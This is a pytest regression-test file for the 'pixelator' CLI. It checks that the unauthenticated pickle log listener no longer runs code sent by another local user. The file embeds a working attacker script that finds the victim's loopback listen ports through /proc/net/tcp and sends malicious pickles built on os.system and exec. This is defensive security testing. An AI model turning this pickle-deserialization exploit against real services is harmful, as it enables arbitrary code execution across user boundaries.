"""Regression tests for the CLI's unauthenticated pickle log listener.

These tests are expected to fail until the listener stops executing data
received from another local user. They pass once a connection that was not
authenticated can no longer run code inside the pixelator process.

Every command that reaches ``main_cli`` shares that listener: the group
callback enters ``LoggingSetup`` before the subcommand runs. The subcommands
themselves (``single-cell-pna`` graph, layout, analysis, denoise, edgelist,
aggregate, graph-collapse, and sample-calling) are not invoked one by one.
``pixelator.pna.analysis_engine`` and ``pixelator.common.utils.parallel`` only
connect out to the same listener with ``SocketHandler``; they do not accept
pickled records, so they are not separate copies of this bug.
"""

from __future__ import annotations

import json
import os
import socket
import subprocess
import tempfile
import textwrap
import threading
import time
from pathlib import Path

import click
import pytest
from click.testing import CliRunner

from pixelator.cli.logging import LoggingSetup
from pixelator.cli.main import main_cli

_HOLD_COMMAND = "hold-log-listener"
_LOOPBACK_OR_ANY = {
    "00000000",  # 0.0.0.0
    "0100007f",  # 127.0.0.1
    "00000000000000000000000000000000",  # ::
    "00000000000000000000000001000000",  # ::1
    "0000000000000000ffff000000000000",  # IPv4-mapped 0.0.0.0
    "0000000000000000ffff00000100007f",  # IPv4-mapped 127.0.0.1
}

# Standalone program run as a different uid. It learns the new listen port
# from /proc/net/tcp (and tcp6), then writes one length-prefixed pickle.
_ATTACKER = textwrap.dedent(
    """\
    import json
    import os
    import pickle
    import socket
    import struct
    import sys
    import time
    from pathlib import Path

    LOOPBACK_OR_ANY = {
        "00000000",
        "0100007f",
        "00000000000000000000000000000000",
        "00000000000000000000000001000000",
        "0000000000000000ffff000000000000",
        "0000000000000000ffff00000100007f",
    }


    def listening_ports(uid):
        found = set()
        for path in ("/proc/net/tcp", "/proc/net/tcp6"):
            try:
                lines = Path(path).read_text().splitlines()[1:]
            except FileNotFoundError:
                continue
            for line in lines:
                parts = line.split()
                if len(parts) < 8 or parts[3] != "0A" or int(parts[7]) != uid:
                    continue
                ip_hex, port_hex = parts[1].split(":")
                if ip_hex.lower() not in LOOPBACK_OR_ANY:
                    continue
                found.add(int(port_hex, 16))
        return found


    def build_payload(gadget, marker):
        if gadget == "os.system":
            command = "/usr/bin/touch " + marker

            class Action:
                def __reduce__(self):
                    return (os.system, (command,))

            return pickle.dumps(Action())
        if gadget == "builtins.exec":
            statement = "open(%r, 'w').write('executed')" % (marker,)

            class Action:
                def __reduce__(self):
                    return (exec, (statement,))

            return pickle.dumps(Action())
        raise SystemExit("unknown gadget")


    def send_message(sock, blob, chunked):
        if not chunked:
            sock.sendall(blob)
            return
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.sendall(blob[:4])
        time.sleep(0.05)
        split = 4 + max(1, (len(blob) - 4) // 2)
        sock.sendall(blob[4:split])
        time.sleep(0.05)
        sock.sendall(blob[split:])


    def main():
        victim_uid = int(sys.argv[1])
        marker = sys.argv[2]
        ready_path = sys.argv[3]
        status_path = sys.argv[4]
        gadget = sys.argv[5]
        chunked = sys.argv[6] == "1"
        before = listening_ports(victim_uid)
        Path(ready_path).write_text("ready")
        deadline = time.time() + 20
        fresh = set()
        while time.time() < deadline:
            fresh = listening_ports(victim_uid) - before
            if fresh:
                break
            time.sleep(0.05)
        time.sleep(0.05)
        fresh = listening_ports(victim_uid) - before
        sent = []
        errors = []
        if fresh:
            body = build_payload(gadget, marker)
            blob = struct.pack(">L", len(body)) + body
            for port in sorted(fresh):
                try:
                    with socket.create_connection(("127.0.0.1", port), timeout=2) as sock:
                        send_message(sock, blob, chunked)
                    sent.append(port)
                except OSError as exc:
                    errors.append("%s:%s" % (port, exc))
        Path(status_path).write_text(
            json.dumps(
                {
                    "uid": os.getuid(),
                    "sent": sent,
                    "errors": errors,
                    "fresh": sorted(fresh),
                }
            )
        )


    if __name__ == "__main__":
        main()
    """
)


def _listening_ports(uid: int) -> set[int]:
    """Return loopback or wildcard TCP listen ports owned by ``uid``.

    The address column of ``/proc/net/tcp`` is what another user on the host
    can read. State ``0A`` is LISTEN.
    """
    found: set[int] = set()
    for path in ("/proc/net/tcp", "/proc/net/tcp6"):
        try:
            lines = Path(path).read_text().splitlines()[1:]
        except FileNotFoundError:
            continue
        for line in lines:
            parts = line.split()
            if len(parts) < 8 or parts[3] != "0A" or int(parts[7]) != uid:
                continue
            ip_hex, port_hex = parts[1].split(":")
            if ip_hex.lower() not in _LOOPBACK_OR_ANY:
                continue
            found.add(int(port_hex, 16))
    return found


def _assert_port_table_shows_a_bound_socket() -> None:
    """Fail the test if this process cannot see its own listen port.

    A parser that misses the port would make the attack look impossible.
    """
    sock = socket.socket(socket.AF_INET)
    sock.bind(("127.0.0.1", 0))
    sock.listen(1)
    try:
        port = sock.getsockname()[1]
        visible = _listening_ports(os.getuid())
    finally:
        sock.close()
    assert port in visible


def _safe_marker(path: Path) -> str:
    text = str(path)
    allowed = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/._-")
    if not path.is_absolute() or any(char not in allowed for char in text):
        raise AssertionError(f"marker path is not safe to hand to another user: {text}")
    return text


def _run_as_other_user(
    *,
    marker: Path,
    gadget: str,
    chunked: bool,
    work: Path,
) -> dict:
    """Start ``nobody`` watching for a new listen port, then return its report.

    The caller starts the listener after ``ready`` is set and keeps it up
    until this function returns.
    """
    script = work / "attacker.py"
    script.write_text(_ATTACKER)
    script.chmod(0o644)
    ready = work / "ready"
    status_path = work / "status.json"
    proc = subprocess.Popen(
        [
            "sudo",
            "-n",
            "-u",
            "nobody",
            "/usr/bin/python3",
            str(script),
            str(os.getuid()),
            _safe_marker(marker),
            str(ready),
            str(status_path),
            gadget,
            "1" if chunked else "0",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    return {"proc": proc, "ready": ready, "status_path": status_path}


def _wait_for_attack(attack: dict) -> dict:
    proc: subprocess.Popen[str] = attack["proc"]
    try:
        stdout, stderr = proc.communicate(timeout=30)
    except subprocess.TimeoutExpired:
        proc.kill()
        stdout, stderr = proc.communicate()
        pytest.fail(f"attacker timed out\nstdout={stdout}\nstderr={stderr}")
    assert proc.returncode == 0, f"attacker failed\nstdout={stdout}\nstderr={stderr}"
    status = json.loads(Path(attack["status_path"]).read_text())
    status["stdout"] = stdout
    status["stderr"] = stderr
    return status


def _assert_untrusted_pickle_did_not_run(
    *,
    marker: Path,
    status: dict,
    listener_port: int | None,
) -> None:
    assert status["uid"] != os.getuid()
    if listener_port is not None:
        assert listener_port in status["sent"], (
            "the log listener was accepting connections, but the other local "
            f"user never delivered a message to port {listener_port}: {status}"
        )
    owner = marker.stat().st_uid if marker.exists() else None
    assert not marker.exists(), (
        "a pickle from another local user ran inside this process "
        f"(listener_port={listener_port}, marker_owner={owner}, "
        f"victim_uid={os.getuid()}, attacker={status})"
    )


@pytest.fixture(autouse=True)
def _port_table_is_readable():
    _assert_port_table_shows_a_bound_socket()


def _tcp_port(server: object) -> int | None:
    """Return a TCP port from a socket server, ignoring non-TCP addresses.

    A private Unix socket has a filesystem address. That is not the TCP
    listener this attack uses, so it must not be treated as one.
    """
    address = getattr(server, "server_address", None)
    if isinstance(address, tuple) and len(address) >= 2 and isinstance(address[1], int):
        return address[1]
    return None


def _hold_logging_setup(observed: dict, started: threading.Event, release: threading.Event):
    """Enter the same context manager the CLI registers, and wait."""
    with LoggingSetup() as logging_setup:
        port = _tcp_port(getattr(logging_setup, "_server", None))
        if port is not None:
            observed["port"] = port
        started.set()
        release.wait(timeout=30)


def _invoke_cli(observed: dict, started: threading.Event, release: threading.Event):
    """Run ``main_cli`` and hold the command open while the listener is up."""

    @click.command(_HOLD_COMMAND)
    @click.pass_context
    def hold(ctx):
        logger = ctx.obj["LOGGER"]
        port = _tcp_port(getattr(logger, "_server", None))
        if port is not None:
            observed["port"] = port
        started.set()
        release.wait(timeout=30)

    main_cli.add_command(hold)
    try:
        result = CliRunner().invoke(main_cli, [_HOLD_COMMAND])
    finally:
        main_cli.commands.pop(_HOLD_COMMAND, None)
    observed["result"] = result


@pytest.mark.parametrize(
    ("entrypoint", "gadget", "chunked"),
    [
        ("cli", "os.system", False),
        ("logging-setup", "builtins.exec", True),
    ],
)
def test_other_local_user_cannot_run_a_pickle_on_the_log_listener(
    entrypoint: str, gadget: str, chunked: bool
):
    """Another uid must not be able to run code via the log listener.

    ``cli`` drives ``main_cli``, which is what ``pixelator`` executes. The
    message is one length-prefixed pickle, the framing ``SocketHandler`` uses.
    ``logging-setup`` enters ``LoggingSetup`` directly and splits that frame
    across several sends. The ``builtins.exec`` payload is not a log record,
    so a check that happens after ``pickle.loads`` returns is already too late.
    """
    marker_dir = Path(tempfile.mkdtemp(prefix="pxl-log-marker-"))
    marker_dir.chmod(0o700)
    marker = marker_dir / "executed"
    work = Path(tempfile.mkdtemp(prefix="pxl-log-attacker-"))
    work.chmod(0o777)
    observed: dict = {}
    started = threading.Event()
    release = threading.Event()
    attack = _run_as_other_user(marker=marker, gadget=gadget, chunked=chunked, work=work)
    try:
        _wait_ready(attack["ready"])
        target = _hold_logging_setup if entrypoint == "logging-setup" else _invoke_cli
        thread = threading.Thread(target=target, args=(observed, started, release), daemon=True)
        thread.start()
        assert started.wait(30), "the pixelator entrypoint did not start the log listener"
        status = _wait_for_attack(attack)
        _assert_untrusted_pickle_did_not_run(
            marker=marker,
            status=status,
            listener_port=observed.get("port"),
        )
    finally:
        release.set()
        if "thread" in locals():
            thread.join(timeout=10)
        proc = attack["proc"]
        if proc.poll() is None:
            proc.kill()
            proc.communicate()


def _wait_ready(ready: Path) -> None:
    deadline = time.time() + 10
    while time.time() < deadline:
        if ready.exists():
            return
        time.sleep(0.05)
    pytest.fail("the other user did not start watching for a listen port")
